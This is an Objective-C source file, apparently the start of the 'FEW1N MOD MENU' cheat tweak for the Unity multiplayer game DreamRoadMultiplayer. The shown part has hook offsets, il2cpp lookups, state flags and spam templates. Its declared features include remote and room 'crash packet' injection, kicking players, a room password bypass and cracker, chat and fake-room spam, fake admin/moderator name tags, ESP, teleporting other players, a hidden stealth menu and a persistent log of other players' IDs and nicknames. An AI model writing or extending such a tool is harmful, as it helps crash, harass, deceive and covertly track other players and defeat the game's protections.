#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <QuartzCore/QuartzCore.h>
#import <CoreGraphics/CoreGraphics.h>
#import <ImageIO/ImageIO.h>
#import <PhotosUI/PhotosUI.h>
#include <substrate.h>
#include <mach-o/dyld.h>
#include <string.h>
#include <dlfcn.h>
#include <math.h>
#import <objc/runtime.h>
#import "Offsets.h"

// ============================================================
//  v114.8 - FEW1N MOD MENU  (derlemeye hazir guncel surum)
//  v114.6 FIX: i_class_from_name(NULL,...) -> few1n_classAnyImage. NULL image SIGSEGV yapip
//  balata + motor olmez + emissive + trafik + /scan + /write ozelliklerini cokertiyordu. Duzeldi.
//  v114.7 BALATA: RCCP_WheelGlow.dob(float) mekanizmasi makine kodunda dogrulandi (t=InverseLerp+gradient*curve).
//  dob(1e9) ve minVisibleTemperature=-100000 ayri test edilebilir; goruntusel sonuc cihazda dogrulanir.
//  v114.8 ODA: Oda sifresi oyunun kullandigi "pWd" custom property ile master odasina yazilir.
//  DUZELTME: rainbowWrap forward-decl (tanim sirasi), decl-order taramasi temiz, autogreet poll optimize.
//  Ozellikler: GERCEK Kick (liste/isim), Ucus D-pad, Emoji sprite+test, Otomatik Karsilama, Normal Oda 31
//  DreamRoadMultiplayer | Unity 6 (6000.3.0b1) | Metadata v39
// ------------------------------------------------------------
//  ONEMLI: Oyun Unity 6'ya guncellendi + isim obfuscation eklendi.
//  Tum offsetler YENI dump.cs'ten (metadata v39) cikarilip, uye
//  isimleri karisik oldugu icin YAPIYA/imzaya gore eslendi.
// ============================================================
//  OFFSET TABLE (yeni Unity6 dump, dogrulandi)
// ------------------------------------------------------------
// Time.set_timeScale(float)                -> 0x6771918
// PhotonNetwork.CloseConnection(Player)    -> 0x5938844
// PhotonNetwork.set_NickName(string)       -> 0x5933940
// ChatManager.get_Instance()               -> 0x31A6168
// ChatManager.Send(string)                 -> 0x31A626C
// CarNitro.get_nitroAmount() [obf: fda]    -> 0x54CFE14
// CarNitro.set_nitroAmount(float)[obf: fdb]-> 0x54CFE1C
// CarDriveSystem.Move(f,f,f,f) [obf: fca]  -> 0x54CCAA0
// PlateVariant.Change(PlateHolder)[obf:gal]-> 0x54EA1FC   (c@0x0, t@0x8)
// HR_UI_RoomListLine.Connect() [obf: elv]  -> 0x54B32F4   (password @ self+0x50)
// HR_PhotonLobbyManager.get_Instance()[eke]-> 0x54A8098   (passwordInput@+0x50, passwordOnConnectInput@+0x60)
// TMP_InputField.set_text(string)          -> 0x65F4CC8
// PlayerManager.get_Instance() [obf: ggn]  -> 0x5A2DE20
// PlayerManager.get_Money()    [obf: ggx]  -> 0x5A4346C
// PlayerManager.AddMoney(int)  [obf: ghm]  -> 0x5A43A2C
// PlayerManager.SyncWithServer()[obf: ghj] -> 0x5A2DF80
// PlayerManager.UpdateNicknameInternal(str)[ghn] -> 0x5A3DDD4
// ============================================================

struct PlateHolder { void* c; void* t; };   // c@0x0, t@0x8
typedef struct { float x, y, z; } Vec3;      // Unity Vector3
typedef struct { float x, y, z, w; } Quaternion; // Unity Quaternion

// ===== PERSIST =====
#define DEF_SUITE @"com.few1n.dreamroadmod"
static NSUserDefaults* defs(void) {
    static NSUserDefaults* d = nil;
    if (!d) d = [[NSUserDefaults alloc] initWithSuiteName:DEF_SUITE] ?: [NSUserDefaults standardUserDefaults];
    return d;
}
static void saveBool(NSString* k, bool v)    { [defs() setBool:v forKey:k]; }
static bool loadBool(NSString* k, bool def)   { return [defs() objectForKey:k] ? [defs() boolForKey:k] : def; }
static void saveInt(NSString* k, int v)       { [defs() setInteger:v forKey:k]; }
static int  loadInt(NSString* k, int def)     { return [defs() objectForKey:k] ? (int)[defs() integerForKey:k] : def; }
static void saveFloat(NSString* k, float v)   { [defs() setFloat:v forKey:k]; }
static float loadFloat(NSString* k, float def) { return [defs() objectForKey:k] ? [defs() floatForKey:k] : def; }
static void saveStr(NSString* k, NSString* v) { if (v) [defs() setObject:v forKey:k]; }
static NSString* loadStr(NSString* k, NSString* def) { NSString* s=[defs() stringForKey:k]; return s?:def; }

// ===== STATE =====
static int    speedMode = 1;
static float  speedMult = 1.0f;   // YENI: slider ile ayarlanan gercek carpan (0.1x-10x); speedMode ile senkron
static bool isInfiniteNitroEnabled = false;
static bool isMasterClaimDisabled = false;   // v74: master claim'i tamamen atla (v70 davranisi)
static bool isColorChatEnabled = false;
static bool isSpamEnabled = false;
static bool isBypassPasswordEnabled = true;
static bool isCustomPlateEnabled = false;
static bool isAutoMoneyEnabled = false;
static bool isFlyEnabled = false;       // hover (dikey hizi 0 tut -> havada surus)
static bool flyAutoThrust = false;      // ucusta otomatik ileri -> sadece direksiyonla don (gaz+don sorunu cozer)
static float flyAutoLevel = 0.7f;       // otomatik gaz seviyesi (0..1)
// ==== NAN / CRASH PAKET INJECT ====
static bool isNanCrashEnabled = false;
static bool isRoomCrashActive = false;
static int  nanCrashMode = 0;        // 0=kapali 1=yerel 2=uzak 3=oda
static bool panicCrash = false;      // aninda cokert
// ==== REKLAM BOZUCU ====
static bool isAdBlockEnabled = false;  // v96: VARSAYILAN KAPALI - kullanici bug yaratiyor dedi
// ==== UCUS D-PAD (ekran kumandasi - mod butonlariyla ucus, g_myRccp gerekmez) ====
static bool isFlyPadShown = false;
static bool g_dpFwd=false, g_dpBack=false, g_dpLeft=false, g_dpRight=false, g_dpUp=false, g_dpDown=false;
static bool isLowGravEnabled = false;   // dususu yavaslat (floaty)
static bool isDriftEnabled = false;     // drift modu (kusursuz yan kayma)
static bool isPopBangsEnabled = false;
// v85: Balata sıcak tut — RCCP_WheelGlow bulunan her nesnede her frame temperature = max yap
static bool isBrakeGlowEnabled = false;
// Iki kaldiraci ayri ayri cihazda test etmek icin. Ikisi birden aciksa eski birlesik davranis korunur.
static bool isBrakeGlowDobEnabled = false;       // Sadece RCCP_WheelGlow.dob(1e9)
static bool isBrakeGlowMinTempEnabled = false;   // Sadece minVisibleTemperature = -100000
static bool isAlwaysLightsEnabled = false;   // v97: Farlar Surekli Acik geri geldi (RCCP_Lights offset 0x40/0x41)
static void* g_wheelGlowTypeObj = NULL;    // typeof(RCCP_WheelGlow)
// v91: Hasar Yok — RCCP_Damage.Update hook ile
static bool isNoDamageEnabled = false;
// RCCP visual/state toggle'lar
static bool isAutoHornEnabled = false;
static bool isRevLimiterEnabled = false;
static bool isCruiseEnabled = false;    // hiz sabitleyici (cruise control)
static float cruiseSpeedKmh = 180.0f;   // hedef sabit hiz (km/h)
static void* g_rb = NULL;               // arabanin Rigidbody'si (h_driveMove'da yakalanir)
static bool isAsciiAnimEnabled = false; // ASCII animasyon spam
static int  asciiAnimIndex = 0;         // hangi animasyon
static int  asciiFrameIdx = 0;          // mevcut kare
static bool isRoomSpamEnabled = false;  // fake oda spam
static char customRoomName[160] = "\xE3\x80\x90\xE2\x98\x85 \xEF\xBC\xA6\xEF\xBC\xA5\xEF\xBC\xB7\xEF\xBC\x91\xEF\xBC\xAE \xE2\x98\x85\xE3\x80\x91";  // 【★ FEW1N ★】 Unicode (hook gerekmez)
static int  roomSpamPhase = 0;          // 0=kur, 1=cik
static int  roomSpamCount = 0;          // kurulan oda sayaci
static int  roomSpamMaxCount = 0;       // hedef (0 = sinirsiz)
static float roomSpamInterval = 0.4f;   // aralik (sn) - hizli
static int  roomSpamTTL = 300000;       // oda acik kalma (ms)
static bool roomSpamContinuous = true;  // surekli mod
static int  roomMaxPlayers = 31;        // odaya girebilecek MAX oyuncu (oyun 10 sinirli; 0=Photon sinirsiz)
static int  spamStyle = 0;              // 0=duz 1=cerceveli 2=sembol 3=renkli
static char customPlateText[64] = "FEW1N";
static char chatSpamText[128] = "FEW1N MOD MENU!";
static char spamColorHex[8] = "00FFFF";   // chat spam rengi (renkli stilde)
static int  customMoneyAmount = 100000000;
// ==== CHAT OTO-DUYURU (donen banner - herkes gorur) ====
static bool  isAnnounceEnabled = false;
static float announceInterval = 5.0f;
static int   g_announceIdx = 0;
static char  announceText[512] = "FEW1N MOD MENU aktif!\nHerkese selam!\nIyi oyunlar";
// ==== OTOMATIK KARSILAMA (odaya girince) ====
static bool  isAutoGreetEnabled = false;
static char  g_greetText[256] = "Selam millet! FEW1N burada 🔥";
static bool  g_wasInRoom = false;          // oda giris/cikis kenar tespiti
// ==== SARKI SOZU -> CHAT (altyazi gibi) ====
static bool isLyricsEnabled = false;
static int  g_lyricsIdx = 0;             // hangi satir
static float lyricsInterval = 2.0f;      // satirlar arasi sn
static bool lyricsColorCycle = true;     // her satiri farkli renk
static bool lyricsLoop = false;          // bitince bastan
static NSMutableArray *g_lyrics = nil;   // satirlar
// ==== ASCII/spam icin renk + isim dongusu (chat spammer gibi) ====
static bool asciiColorCycle = false;     // ASCII spam'i gokkusagi renkte gonder
static int  g_colorIdx = 0;              // donen renk indeksi
// ==== ACCORDION MENU (katlanir bolumler) ====
static int  g_secBuildIdx = -1;          // build sirasinda mevcut bolum sayaci
static bool g_secOpen[24] = {0};         // her bolum acik mi (basliga basinca degisir)
// ==== HACKER/PRO MODE ====
static int  nameTrickMode = 0;            // 0=kapali 1=admin 2=mod 3=dev 4=hacker 5=matrix 6=glitch 7=binary
static bool isMatrixChatEnabled = false;  // chat mesajlarini matrix stiline cevir
static bool isGlitchChatEnabled = false;  // chat mesajlarini glitch stiline cevir
static bool isStealthMode = false;        // menuyu gizle, sadece gizli gesture ile ac
static int  stealthTapCount = 0;          // gizli acma icin triple-tap sayaci
static NSDate *stealthLastTap = nil;      // son tap zamani
static bool isRoomMasterHack = false;     // odaya girince master olmaya calis
static int  chatTemplateIdx = 0;          // hazir chat sablonu indeksi

static NSTimer *spamTimer = nil;
static NSTimer *tickTimer = nil;
static NSTimer *asciiTimer = nil;
static NSTimer *lyricsTimer = nil;
static NSTimer *roomSpamTimer = nil;
static NSTimer *brakeGlowTimer = nil;   // v93: Balata SUREKLI aktif tutmak icin 2s reapply timer
static NSTimer *gizliCheatTimer = nil;  // v100: RCCP + HR gizli ozellik apply timer (1.5s reapply)

// v100: Gizli ozellik toggle globalleri (dump.cs il2cpp field API ile)
static bool isInfiniteNosEnabled = false;
static bool isInfiniteFuelEnabled = false;
static bool isNoDamageV2Enabled = false;
static bool isMaxRpmEnabled = false;
static bool isNoTrafficEnabled = false;
static bool isEngineImmortalEnabled = false;      // motor olmez
static bool isExhaustFlameEnabled = false;        // egzoz alev surekli
static bool isSpoilerRaisedEnabled = false;       // spoiler yukselt
// v102: 6 yeni ozellik
static bool isEmissivePaintEnabled = false;   // parlak emissive boya
static bool isExhaustFlameOnEnabled = false;  // egzoz alev surekli
static bool isVidyoNamesEnabled = false;      // oyuncu isimleri vidyo
// v105: Isim degisikligi takibi
static bool isNameTrackEnabled = false;
static NSMutableDictionary<NSNumber*, NSString*> *g_actorNickMap = nil;   // ActorNumber -> son bilinen nick
static NSMutableDictionary<NSNumber*, NSMutableArray<NSString*>*> *g_actorNickHistory = nil;  // ActorNumber -> nick history
static NSTimer *nameTrackTimer = nil;
// v106: KALICI FINGERPRINT - UserId -> tum zamanlarda gordugumuz nickList (NSUserDefaults'a kayit)
static NSMutableDictionary<NSString*, NSMutableArray<NSString*>*> *g_permaFingerprint = nil;
static NSString* const kPermaFingerprintKey = @"few1n_permaFingerprint";

static inline void few1n_loadPermaFingerprint(void) {
    if (g_permaFingerprint) return;
    NSDictionary *saved = [[NSUserDefaults standardUserDefaults] dictionaryForKey:kPermaFingerprintKey];
    g_permaFingerprint = [NSMutableDictionary dictionary];
    if (saved) {
        for (NSString *uid in saved.allKeys) {
            NSArray *nicks = saved[uid];
            if ([nicks isKindOfClass:[NSArray class]])
                g_permaFingerprint[uid] = [nicks mutableCopy];
        }
    }
}
static inline void few1n_savePermaFingerprint(void) {
    if (!g_permaFingerprint) return;
    [[NSUserDefaults standardUserDefaults] setObject:g_permaFingerprint forKey:kPermaFingerprintKey];
}

// v100: RCCP + HR class type ptr'leri (il2cpp resolve)
static void* g_rccpNosTypeObj = NULL;
static void* g_rccpFuelTypeObj = NULL;
static void* g_rccpDamageTypeObj = NULL;
static void* g_rccpEngineTypeObj = NULL;
static void* g_hrTrafficTypeObj = NULL;
static void* g_rccpExhaustTypeObj = NULL;
static void* g_rccpSpoilerTypeObj = NULL;
static void* g_hrBombTypeObj = NULL;
static void* g_hrTrafficCarTypeObj = NULL;
static void* g_hrPhotonSyncTypeObj = NULL;
static void* g_rccpDetachTypeObj = NULL;
// v114.4: HR_PhotonLobbyManagerDummy - chain sonu oda listesi ekrani icin
static void* g_hrLobbyMgrDummyType = NULL;
static void* g_mGoSetActive = NULL;      // UnityEngine.GameObject.SetActive(bool)
static int g_offRoomListPanel = 0;
static int g_offRoomListContent = 0;
static int g_offDetachStrength = 0, g_offDetachIsDetachable = 0;
static int g_offExhaustFlameCutoff = 0;
static int g_offPhotonIsMine = 0;

// v100: Field offset'leri (il2cpp API runtime'da alir - versiyon-dayanikli)
static int g_offNosAmount = 0, g_offNosRegen = 0, g_offNosTorqMult = 0;
static int g_offFuelFill = 0, g_offFuelCap = 0, g_offFuelConsump = 0;
static int g_offDamageMax = 0, g_offDamageMult = 0;
static int g_offEngineRpm = 0, g_offEngineMaxRpm = 0, g_offEngineOverride = 0;
static int g_offTrafficAmount = 0;
static NSTimer *nameMarqueeTimer = nil;   // kayan yazi isim / isim dongusu
static NSTimer *announceTimer = nil;      // chat oto-duyuru

// ASCII & Neon Animasyon Setleri (Yuksek Kaliteli Renkli Stiller)
static NSArray* asciiAnims(void) {
    return @[
        // 1. Rainbow FEW1N HACK (Gokkusagi renk degisimi)
        @[@"<color=#FF0000><b>FEW1N HACK</b></color>", @"<color=#FF7F00><b>FEW1N HACK</b></color>",
          @"<color=#FFFF00><b>FEW1N HACK</b></color>", @"<color=#00FF00><b>FEW1N HACK</b></color>",
          @"<color=#00FFFF><b>FEW1N HACK</b></color>", @"<color=#4466FF><b>FEW1N HACK</b></color>",
          @"<color=#FF00FF><b>FEW1N HACK</b></color>"],
        // 2. Neon Matrix (Yesil dijital kod)
        @[@"<color=#00FF00>01001 FEW1N 10110</color>",
          @"<color=#00FF00>10110 FEW1N 01001</color>",
          @"<color=#00FF00>█▓▒░ FEW1N ░▒▓█</color>"],
        // 3. Pulse (Buyuyup kuculen parlak neon)
        @[@"<size=100%><color=#00FFFF><b>FEW1N HACK</b></color></size>",
          @"<size=130%><color=#FF00FF><b>⚡ FEW1N HACK ⚡</b></color></size>",
          @"<size=150%><color=#FFFF00><b>⚡ FEW1N HACK ⚡</b></color></size>",
          @"<size=130%><color=#FF00FF><b>⚡ FEW1N HACK ⚡</b></color></size>"],
        // 4. Ates Efekti (Kirmizi - Turuncu - Sari)
        @[@"<color=#FF0000>🔥 FEW1N 🔥</color>",
          @"<color=#FF6600>🔥 FEW1N HACK 🔥</color>",
          @"<color=#FFCC00>🔥 FEW1N HACK 🔥</color>"],
        // 5. Buz Efekti (Buz mavisi tonlari)
        @[@"<color=#00CCFF>❄ FEW1N ❄</color>",
          @"<color=#66E0FF>❄ FEW1N HACK ❄</color>",
          @"<color=#FFFFFF>❄ FEW1N HACK ❄</color>"],
        // 6. Kalp Atisi (Neon Pembe)
        @[@"<size=90%><color=#FF0055>♥ FEW1N ♥</color></size>",
          @"<size=140%><color=#FF0055>♥ FEW1N HACK ♥</color></size>",
          @"<size=90%><color=#FF0055>♥ FEW1N ♥</color></size>"],
        // 7. Daktilo Neon (Yesil harf harf dolma)
        @[@"<color=#00FF88><b>F</b></color>", @"<color=#00FF88><b>FE</b></color>",
          @"<color=#00FF88><b>FEW</b></color>", @"<color=#00FF88><b>FEW1</b></color>",
          @"<color=#00FF88><b>FEW1N</b></color>", @"<color=#00FF88><b>FEW1N HACK</b></color>"],
        // 8. Glitch Efekti (Mor - Turkuaz - Kirmizi)
        @[@"<color=#FF00FF>F̷E̷W̷1̷N̷</color>", @"<color=#00FFFF>F3W1N HACK</color>", @"<color=#FF0000>FΞW1N HACK</color>", @"<b>FEW1N HACK</b>"],
        // 9. Rainbow Cerceve (Renkli kenarlikli)
        @[@"<color=#FF0000>▐</color><color=#FFFF00> FEW1N HACK </color><color=#00FFFF>▌</color>",
          @"<color=#00FF00>▐</color><color=#FF00FF> FEW1N HACK </color><color=#FF8800>▌</color>"],
        // 10. MEGA EKRAN KAPLAYAN DEV KUTU (Cok satir + Dev Size)
        @[@"<size=160%><color=#FF0000><b>╔══════════════╗\n║  ⚡ FEW1N MOD ⚡  ║\n╚══════════════╝</b></color></size>",
          @"<size=160%><color=#00FFFF><b>╔══════════════╗\n║  ⚡ FEW1N HACK ⚡ ║\n╚══════════════╝</b></color></size>",
          @"<size=160%><color=#FFFF00><b>╔══════════════╗\n║  ⚡ FEW1N MOD ⚡  ║\n╚══════════════╝</b></color></size>"],
        // 11. MEGA MATRIX DUVARI (Ekran kaplayan cok satirli dijital kod)
        @[@"<color=#00FF00><b>0101010101010101010101\n█▓▒░ FEW1N HACK ░▒▓█\n1010101010101010101010</b></color>",
          @"<color=#00FF88><b>1010101010101010101010\n░▒▓█ FEW1N HACK █▓▒░\n0101010101010101010101</b></color>"],
        // 12. FULL MARK RENK KAPLAMA (Arka plani renkli dev banner)
        @[@"<mark=#FF0055AA><size=150%><color=#FFFFFF><b> ★ FEW1N MOD MENU ★ </b></color></size></mark>",
          @"<mark=#00AAFFAA><size=150%><color=#FFFFFF><b> ★ FEW1N MOD MENU ★ </b></color></size></mark>",
          @"<mark=#FFCC00AA><size=150%><color=#000000><b> ★ FEW1N MOD MENU ★ </b></color></size></mark>"],
        // 13. DEV SIMSEKLI NEON KUTU
        @[@"<size=140%><color=#00FFFF><b>⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n⚡ FEW1N HACK ⚡\n⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡</b></color></size>",
          @"<size=140%><color=#FF00FF><b>⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n⚡ FEW1N HACK ⚡\n⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡</b></color></size>"],
        // 14. ZIPLAYAN TOP (mini video)
        @[@"<color=#00FF88><b>|            |\n|            |\n|            |\n| ●          |\n|____________|</b></color>",
          @"<color=#00FF88><b>|            |\n|            |\n|   ●        |\n|            |\n|____________|</b></color>",
          @"<color=#00FF88><b>|            |\n|     ●      |\n|            |\n|            |\n|____________|</b></color>",
          @"<color=#00FF88><b>|            |\n|            |\n|       ●    |\n|            |\n|____________|</b></color>",
          @"<color=#00FF88><b>|            |\n|            |\n|            |\n|         ●  |\n|____________|</b></color>",
          @"<color=#00FF88><b>|            |\n|            |\n|       ●    |\n|            |\n|____________|</b></color>",
          @"<color=#00FF88><b>|            |\n|     ●      |\n|            |\n|            |\n|____________|</b></color>",
          @"<color=#00FF88><b>|            |\n|            |\n|   ●        |\n|            |\n|____________|</b></color>"],
        // 15. DALGA (temiz su dalgasi - yazisiz)
        @[@"<color=#00CCFF>▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁</color>",
          @"<color=#22B8FF>▂▃▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▂</color>",
          @"<color=#44A8FF>▃▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▂▃</color>",
          @"<color=#6699FF>▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▂▃▄</color>",
          @"<color=#8888FF>▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▂▃▄▅</color>",
          @"<color=#6699FF>▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▂▃▄▅▆</color>",
          @"<color=#44A8FF>▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▂▃▄▅▆▇</color>",
          @"<color=#22B8FF>█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▂▃▄▅▆▇█</color>"],
        // 16. HACKLENIYOR (yukleme cubugu)
        @[@"<color=#00FF00><b>[█░░░░░░░] FEW1N BAGLANIYOR</b></color>",
          @"<color=#00FF00><b>[██░░░░░░] FEW1N TARANIYOR</b></color>",
          @"<color=#00FF00><b>[███░░░░░] FEW1N SIFRE KIRILIYOR</b></color>",
          @"<color=#00FF00><b>[████░░░░] FEW1N VERI ALINIYOR</b></color>",
          @"<color=#00FF00><b>[█████░░░] FEW1N ENJEKTE</b></color>",
          @"<color=#00FF00><b>[██████░░] FEW1N BYPASS</b></color>",
          @"<color=#00FF00><b>[███████░] FEW1N YETKI ALINDI</b></color>",
          @"<color=#00FF00><b>[████████] FEW1N HACKLENDI!</b></color>"],
        // 17. FEW1N HACK RENKSIZ (duz beyaz - renk yok)
        @[@"<b>F E W 1 N   H A C K</b>",
          @"<b>>>  FEW1N HACK  <<</b>",
          @"<b>>>>>  FEW1N HACK  <<<<</b>",
          @"<b>>>  FEW1N HACK  <<</b>"]
    ];
}

// ===== MATRIX / GLITCH / BINARY ISIM HELPERS =====
static NSString* matrixWrapName(NSString* base) {
    if (!base || base.length == 0) return @"FEW1N";
    NSArray *cols = @[@"#00FF00", @"#00CC00", @"#008800", @"#44FF44", @"#88FF88"];
    NSMutableString *res = [NSMutableString string];
    for (int i = 0; i < (int)base.length; i++) {
        NSString *c = [base substringWithRange:NSMakeRange(i, 1)];
        NSString *col = cols[i % cols.count];
        [res appendFormat:@"<color=%@>%@</color>", col, c];
    }
    return res;
}
static NSString* glitchWrapName(NSString* base) {
    if (!base || base.length == 0) return @"F̷E̷W̷1̷N̷";
    NSArray *glitchChars = @[@"̷", @"̶", @"̲", @"̅", @"̈", @"̇", @"̊", @"̛", @"̣", @"̤"];
    NSMutableString *res = [NSMutableString string];
    for (int i = 0; i < (int)base.length; i++) {
        NSString *c = [base substringWithRange:NSMakeRange(i, 1)];
        [res appendFormat:@"%@%@", c, glitchChars[i % glitchChars.count]];
    }
    return res;
}
static NSString* binaryWrapName(NSString* base) {
    if (!base || base.length == 0) return @"01000110 01000101 01010111 00110001 01001110";
    NSArray *cols = @[@"#00FF00", @"#00FFFF", @"#FF00FF"];
    NSMutableString *res = [NSMutableString string];
    for (int i = 0; i < (int)base.length; i++) {
        unichar ch = [base characterAtIndex:i];
        NSString *bin = @"";
        for (int b = 7; b >= 0; b--) bin = [bin stringByAppendingFormat:@"%d", (ch >> b) & 1];
        NSString *col = cols[i % cols.count];
        [res appendFormat:@"<color=%@>%@</color> ", col, bin];
    }
    return res;
}
static NSString* hackerTagWrap(NSString* base, int mode) {
    switch (mode) {
        case 1: return [NSString stringWithFormat:@"[ADMIN] %@", base];   // Fake Admin
        case 2: return [NSString stringWithFormat:@"[MOD] %@", base];     // Fake Mod
        case 3: return [NSString stringWithFormat:@"[DEV] %@", base];     // Fake Dev
        case 4: return [NSString stringWithFormat:@"⚡ %@ ⚡", base];      // Hacker
        case 5: return matrixWrapName(base);                               // Matrix
        case 6: return glitchWrapName(base);                               // Glitch
        case 7: return binaryWrapName(base);                               // Binary
        default: return base;
    }
}
static NSString* matrixWrapChat(NSString* msg) {
    if (!msg || msg.length == 0) return msg;
    return [NSString stringWithFormat:@"<color=#00FF00><b>[SYSTEM]</b></color> <color=#00CC00>%@</color>", msg];
}
static NSString* glitchWrapChat(NSString* msg) {
    if (!msg || msg.length == 0) return msg;
    return [NSString stringWithFormat:@"<color=#FF00FF><b>[ROOT]</b></color> <color=#00FFFF>%@</color>", msg];
}
// forward decl: rainbowWrap fireSpam icinde tanimindan (asagida) once kullaniliyor -> kesin cozum
static NSString* rainbowWrap(NSString* text, int idx);
static NSArray* chatTemplates(void) {
    return @[
        @"<color=#FF0000><b>SYSTEM BREACH DETECTED</b></color>",
        @"<color=#00FF00><b>HACKED BY FEW1N</b></color>",
        @"<color=#00FFFF><b>ROOT ACCESS GRANTED</b></color>",
        @"<color=#FF00FF><b>INJECTING PAYLOAD...</b></color>",
        @"<color=#FFFF00><b>BACKDOOR ESTABLISHED</b></color>",
        @"<color=#FF0000><size=150%>⚠️ WARNING ⚠️</size></color>",
        @"<color=#00FF00>01000110 01000101 01010111 00110001 01001110</color>",
        @"<color=#00FFFF><b>FEW1N MOD MENU v33.3</b></color>",
        @"<color=#FF00FF><b>PRIVILEGE ESCALATION COMPLETE</b></color>",
        @"<color=#00FF00><b>SERVER UNDER CONTROL</b></color>",
        @"<color=#FF0000><b>UNAUTHORIZED ACCESS</b></color>",
        @"<color=#FFFF00><b>TOP SECRET - CLASSIFIED</b></color>"
    ];
}
static void* (*cached_il2cpp_string_new)(const char*) = NULL;
static void* mkStr(NSString* s) {
    if (!cached_il2cpp_string_new)
        cached_il2cpp_string_new = (void*(*)(const char*))dlsym(RTLD_DEFAULT, "il2cpp_string_new");
    if (!cached_il2cpp_string_new || !s) return NULL;
    return cached_il2cpp_string_new(s.UTF8String);
}
static uintptr_t global_base = 0;
static int hookSuccessCount = 0;
static int hookFailCount = 0;

// ===== EKRAN LOGU (menude gosterilir) =====
static NSMutableArray<NSString*>* gLog = nil;
static void FLog(NSString* line) {
    if (!line) return;
    NSLog(@"[FEW1N] %@", line);
    if (!gLog) gLog = [NSMutableArray new];
    [gLog addObject:line];
    if (gLog.count > 250) [gLog removeObjectAtIndex:0];
}

// ===== IL2CPP API (iGameGod tarzi - isimle bul, runtime_invoke ile cagir) =====
static void* (*i_domain_get)(void) = NULL;
static void** (*i_domain_get_assemblies)(void*, unsigned long*) = NULL;
static const void* (*i_assembly_get_image)(void*) = NULL;
static void* (*i_class_from_name)(const void*, const char*, const char*) = NULL;
static void* (*i_class_get_method_from_name)(void*, const char*, int) = NULL;
static void* (*i_runtime_invoke)(void*, void*, void**, void**) = NULL;
static void* (*i_thread_attach)(void*) = NULL;
static void* (*i_domain_get_ptr)(void) = NULL;
static void* g_mSetTS = NULL;   // set_timeScale MethodInfo*
static void* g_mGetTS = NULL;   // get_timeScale MethodInfo*
static void* g_mRbGetVel = NULL; // Rigidbody.get_linearVelocity MethodInfo*
static void* g_mRbSetVel = NULL; // Rigidbody.set_linearVelocity MethodInfo*
static void* g_mRbGetPos = NULL; // Rigidbody.get_position MethodInfo*  (isinlanma icin)
static void* g_mRbSetPos = NULL; // Rigidbody.set_position MethodInfo*
static void* g_mSetRichText = NULL; // TMP_Text.set_richText MethodInfo* (oda ismi rich text acigi)
static void* (*i_object_new)(void*) = NULL;   // il2cpp_object_new
// v114.19: safeHookByName icin - metodun C fonksiyon adresini isim ile bul
static void* (*i_method_get_pointer)(void*) = NULL;   // il2cpp_method_get_pointer
static void* g_roomOptionsClass = NULL;       // Photon.Realtime.RoomOptions Il2CppClass*
static void* g_roomClass = NULL;              // Photon.Realtime.Room Il2CppClass*
static void* g_mRoomSetName = NULL;           // Photon.Realtime.Room.set_Name(string) — sunucuya push umulur
// v114.10: SetCustomProperties + SetPropertiesListedInLobby'yi isim ile bul (hardcoded offset drift'e dayaniksiz)
static void* g_mRoomSetCustomProperties = NULL;         // Room.SetCustomProperties(Hashtable, Hashtable, WebFlags)
static void* g_mRoomSetPropertiesListedInLobby = NULL;  // Room.SetPropertiesListedInLobby(string[])
static void* g_stringClass = NULL;                      // System.String — string[] arg'i icin
static void* (*i_array_new)(void*, unsigned long) = NULL;  // il2cpp_array_new
static bool  g_il2cppReady = false;
// v85: Photon Hashtable helper — sifre ve custom oda property'leri icin
static void* g_hashtableClass = NULL;
static void* g_mHashtableCtor = NULL;
static void* g_mHashtableSetItem = NULL;
// ==== ESP (Camera + tum arabalar) ====
static void* g_mCamGetMain = NULL;     // UnityEngine.Camera.get_main
static void* g_mWorldToScreen = NULL;  // Camera.WorldToScreenPoint(Vector3)->Vector3
static void* g_mFindObjectsPlural = NULL; // Object.FindObjectsOfType(Type)->array (TUM nesneler)
static bool  isEspEnabled = false;
// ==== PLAKA (il2cpp ile zorla - hook olu) ====
static void* g_mTmpSetText = NULL;     // TMP_Text.set_text(string)
static void* g_plateTypeObj = NULL;    // typeof(PlateVariant)
// ==== SIFRE KIRICI (RoomListLine.password client'ta) ====
static void* g_roomLineType = NULL;    // typeof(HR_UI_RoomListLine)
// ==== RIGIDBODY YEDEK YOLU (CarDriveSystem bulunamazsa kameraya en yakin arac) ====
static void* g_rbTypeObj = NULL;       // typeof(UnityEngine.Rigidbody)
static void* g_mCompGetTransform = NULL; // Component.get_transform
static void* g_mTransGetPos = NULL;    // Transform.get_position -> Vector3
static void* g_mGetCompInParent = NULL; // Component.GetComponentInParent(Type,bool)
// ==== PHOTONVIEW.IsMine = KESIN "benim arabam" ayrimi ====
static void* g_photonViewType = NULL;  // typeof(Photon.Pun.PhotonView)
static void* g_mIsMine = NULL;         // PhotonView.get_IsMine -> bool (KULLANILMIYOR - cokuyordu)
static void* g_fIsMine = NULL;         // PhotonView.<IsMine>k__BackingField (FieldInfo)
static int   g_isMineOff = 0;          // IsMine byte offset @0x68 (dogrudan okuma - cokme YOK)
static void* g_fOwner = NULL;          // PhotonView.<Owner>k__BackingField (FieldInfo)
static int   g_pvOwnerOff = 0;         // Owner (Player*) byte offset @0x80 (isim icin)
// ==== OYUNCUYU ISINLAMA RPC (CarPhotonSync & HR_PhotonHandler) ====
static void* g_carPhotonSyncTypeObj = NULL;   // typeof(CarPhotonSync)
static void* g_hrPhotonHandlerTypeObj = NULL; // typeof(HR_PhotonHandler)
static void (*cps_TeleportCar_RPC)(void* cps, Vec3 pos, Quaternion rot, void* method) = NULL;
static void (*rbps_TeleportCar_RPC)(void* rbps, Vec3 pos, Quaternion rot, void* method) = NULL;
